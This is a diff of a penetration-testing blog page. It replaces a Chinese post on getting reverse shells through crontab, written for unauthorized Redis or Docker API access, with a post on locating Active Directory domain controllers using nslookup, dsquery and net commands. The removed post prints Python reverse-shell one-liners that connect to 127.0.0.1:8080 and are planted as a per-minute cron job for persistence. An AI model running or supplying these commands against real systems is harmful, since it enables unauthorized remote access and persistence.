@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Linux,Shell," />
+  <meta name="keywords" content="Pentest,Domain,DC," />
 
 
 
@@ -86,27 +86,28 @@
 
 
 
-<meta name="description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog
- 
-图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出
-所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
+<meta name="description" content="Find Domain Controller0x00 Find domain controller via DNS
+https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/
+
+DC may be  the default DNS server.
+123456789101112131415161718">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux crontab back Shell">
-<meta property="og:url" content="http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html">
+<meta property="og:title" content="Find Domain Controller">
+<meta property="og:url" content="http://blog.smilent.me/2016-06-06-find-domain-controller.html">
 <meta property="og:site_name" content="Smilent">
-<meta property="og:description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog
- 
-图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出
-所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
-<meta property="og:image" content="http://joychou.org/usr/uploads/2016/05/1700093592.png">
-<meta property="og:updated_time" content="2016-06-03T10:27:19.000Z">
+<meta property="og:description" content="Find Domain Controller0x00 Find domain controller via DNS
+https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/
+
+DC may be  the default DNS server.
+123456789101112131415161718">
+<meta property="og:updated_time" content="2016-06-06T15:47:31.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux crontab back Shell">
-<meta name="twitter:description" content="0x00 前言今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用bash反弹shell，一直不成功。查看/var/log/syslog
- 
-图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出
-所以很惊讶为什么不能够成功，不管是/etc/crontab还是/var/spool/cron/crontabs/">
-<meta name="twitter:image" content="http://joychou.org/usr/uploads/2016/05/1700093592.png">
+<meta name="twitter:title" content="Find Domain Controller">
+<meta name="twitter:description" content="Find Domain Controller0x00 Find domain controller via DNS
+https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/
+
+DC may be  the default DNS server.
+123456789101112131415161718">
 
 
 
@@ -124,7 +125,7 @@
   };
 </script>
 
-  <title> Linux crontab back Shell | Smilent </title>
+  <title> Find Domain Controller | Smilent </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -264,7 +265,7 @@
             
             
               
-                Linux crontab back Shell
+                Find Domain Controller
               
             
           </h1>
@@ -276,8 +277,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-05-25T00:00:00+08:00" content="2016-05-25">
-              2016-05-25
+            <time itemprop="dateCreated" datetime="2016-06-06T00:00:00+08:00" content="2016-06-06">
+              2016-06-06
             </time>
           </span>
 
@@ -306,8 +307,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016-05-25-linux-crontab-rebound-shell-hole.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016-05-25-linux-crontab-rebound-shell-hole.html" itemprop="commentsCount"></span>
+                <a href="/2016-06-06-find-domain-controller.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016-06-06-find-domain-controller.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -317,7 +318,7 @@
 
           
           
-             <span id="/2016-05-25-linux-crontab-rebound-shell-hole.html" class="leancloud_visitors" data-flag-title="Linux crontab back Shell">
+             <span id="/2016-06-06-find-domain-controller.html" class="leancloud_visitors" data-flag-title="Find Domain Controller">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -339,37 +340,16 @@
       
 
       
-        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用<code>bash</code>反弹shell，一直不成功。查看<code>/var/log/syslog</code></p>
-<p> <img src="http://joychou.org/usr/uploads/2016/05/1700093592.png" alt="1"></p>
-<p>图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出</p>
-<p>所以很惊讶为什么不能够成功，不管是<code>/etc/crontab</code>还是<code>/var/spool/cron/crontabs/</code><br><a id="more"></a><br>所以有了下面的内容</p>
-<p>测试环境：</p>
-<ul>
-<li>ubuntu 14.04</li>
-<li>centos 6.5</li>
-</ul>
-<h3 id="0x01-1号坑（ubuntu不能使用bash反弹shell）"><a href="#0x01-1号坑（ubuntu不能使用bash反弹shell）" class="headerlink" title="0x01 1号坑（ubuntu不能使用bash反弹shell）"></a>0x01 1号坑（ubuntu不能使用<code>bash</code>反弹shell）</h3><p>可能大家平时比较少人ubuntu，所以不大知道这个特性</p>
-<p>今天让几个朋友测试了，结果是：<br><code>/etc/crontab</code>和<code>/var/spool/cron/crontabs/</code>，<code>bash -i</code>反弹shell都失败</p>
-<p>但是python可以，而且现在centos和ubuntu基本都自带python</p>
-<p>执行以下命令，以当前bash权限用户，创建一个crontab文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab <span class="_">-l</span>;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</span><br></pre></td></tr></table></figure></p>
-<p><code>crontab -</code>将管道符前面的内容写入到当前用户的crontab文件里</p>
-<p><code>* * * * *</code>表示每一分钟执行该命令，等同于<code>*/1 * * * *</code></p>
-<p>如果是ubuntu的root权限，写到<code>/var/spool/cron/crontabs/root</code>文件<br>如果是centos的root权限，写到<code>/var/spool/cron/root</code></p>
-<p>执行成功后，相应的文件创建或者追加如下内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * *  /usr/bin/python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）"><a href="#0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）" class="headerlink" title="0x02 2号坑（ubuntu用户的定时任务在/var/spool/cron/crontabs/目录下）"></a>0x02 2号坑（ubuntu用户的定时任务在<code>/var/spool/cron/crontabs/</code>目录下）</h3><p>之前，一直误认为所有linux系统用户的定时任务都在<code>/var/spool/cron/</code>目录下</p>
-<p>其实是我自以为，人最怕只以为是……</p>
-<p>现在回想起来，终于可以解释之前写的hackredis.py中，为何有时不能创建<code>/root/.ssh/</code>目录</p>
-<p>因为代码中我写的crontab文件固定，是<code>/var/spool/cron/root</code>，导致在ubuntu系统中，定时任务未能成功创建</p>
-<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>如果只能写文件，想反弹shell通用（比如redis未授权访问）</p>
-<ol>
-<li>写<code>/etc/crontab</code>文件</li>
-<li>使用python反弹shell的脚本<br>如果可以执行命令，想反弹shell通用（比如docker remote api未授权访问)</li>
-<li>写当前用户下的crontab 或者写<code>/etc/crontab</code>也可以</li>
-<li>使用python反弹shell的脚本</li>
-</ol>
-<p>写当前用户下的crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab <span class="_">-l</span>;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</span><br></pre></td></tr></table></figure></p>
-<p>写/etc/crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure></p>
-<p>原文:<a href="http://joychou.org/index.php/web/linux-crontab-rebound-shell-hole.html" target="_blank" rel="external">JoyChou</a></p>
+        <h1 id="Find-Domain-Controller"><a href="#Find-Domain-Controller" class="headerlink" title="Find Domain Controller"></a>Find Domain Controller</h1><h2 id="0x00-Find-domain-controller-via-DNS"><a href="#0x00-Find-domain-controller-via-DNS" class="headerlink" title="0x00 Find domain controller via DNS"></a>0x00 Find domain controller via DNS</h2><blockquote>
+<p><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="external">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></p>
+</blockquote>
+<p>DC may be  the default DNS server.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dm1&gt;nslookup -type=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line"></span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line"></span><br><span class="line">服务器:  UnKnown</span><br><span class="line"></span><br><span class="line">Address:  192.168.72.134</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_ldap._tcp.corp.sm.com  SRV service location:</span><br><span class="line"></span><br><span class="line">          priority       = 0</span><br><span class="line"></span><br><span class="line">          weight         = 100</span><br><span class="line"></span><br><span class="line">          port           = 389</span><br><span class="line"></span><br><span class="line">          svr hostname   = win-dc.corp.sm.com</span><br><span class="line"></span><br><span class="line">win-dc.corp.sm.com      internet address = 192.168.72.134</span><br></pre></td></tr></table></figure>
+<p>or ifconfig.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig /all</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-dsquery-with-Windows-2003"><a href="#0x01-dsquery-with-Windows-2003" class="headerlink" title="0x01 dsquery with Windows 2003"></a>0x01 dsquery with Windows 2003</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-net-group"><a href="#0x02-net-group" class="headerlink" title="0x02 net group"></a>0x02 net group</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`net group &quot;Domain Controllers&quot; /domain`</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-net-time"><a href="#0x03-net-time" class="headerlink" title="0x03 net time"></a>0x03 net time</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`net time /domain`</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -391,9 +371,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag">#Linux</a>
+            <a href="/tags/Pentest/" rel="tag">#Pentest</a>
           
-            <a href="/tags/Shell/" rel="tag">#Shell</a>
+            <a href="/tags/Domain/" rel="tag">#Domain</a>
+          
+            <a href="/tags/DC/" rel="tag">#DC</a>
           
         </div>
       
@@ -402,17 +384,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html" rel="next" title="Redis vulnerability via SSH authorized_keys">
-                <i class="fa fa-chevron-left"></i> Redis vulnerability via SSH authorized_keys
+              <a href="/2016-05-25-linux-crontab-rebound-shell-hole.html" rel="next" title="Linux crontab back Shell">
+                <i class="fa fa-chevron-left"></i> Linux crontab back Shell
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016-06-06-find-domain-controller.html" rel="prev" title="Find Domain Controller">
-                Find Domain Controller <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -438,8 +416,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016-05-25-linux-crontab-rebound-shell-hole.html"
-           data-title="Linux crontab back Shell" data-url="http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html">
+      <div class="ds-thread" data-thread-key="2016-06-06-find-domain-controller.html"
+           data-title="Find Domain Controller" data-url="http://blog.smilent.me/2016-06-06-find-domain-controller.html">
       </div>
     
   </div>
@@ -571,7 +549,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-1号坑（ubuntu不能使用bash反弹shell）"><span class="nav-number">2.</span> <span class="nav-text">0x01 1号坑（ubuntu不能使用bash反弹shell）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）"><span class="nav-number">3.</span> <span class="nav-text">0x02 2号坑（ubuntu用户的定时任务在/var/spool/cron/crontabs/目录下）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-总结"><span class="nav-number">4.</span> <span class="nav-text">0x03 总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Find-Domain-Controller"><span class="nav-number">1.</span> <span class="nav-text">Find Domain Controller</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Find-domain-controller-via-DNS"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 Find domain controller via DNS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-dsquery-with-Windows-2003"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 dsquery with Windows 2003</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-net-group"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 net group</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-net-time"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 net time</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
